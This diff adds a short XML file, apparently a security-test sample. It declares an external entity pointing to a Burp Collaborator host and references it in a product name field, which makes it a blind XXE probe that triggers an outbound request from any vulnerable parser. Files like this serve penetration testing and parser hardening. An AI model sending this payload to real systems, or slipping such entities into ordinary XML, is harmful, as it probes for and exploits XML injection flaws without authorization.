@@ -1,0 +1,11 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE boo [
+        <!ENTITY xxe SYSTEM "http://gyiv38a8htdpb0m9zfr7w95tkkqaez.burpcollaborator.net">
+        ]>
+<bill>
+    <product id="26">
+        <name>&xxe;</name>
+        <quantity>0</quantity>
+        <price>0</price>
+    </product>
+</bill>
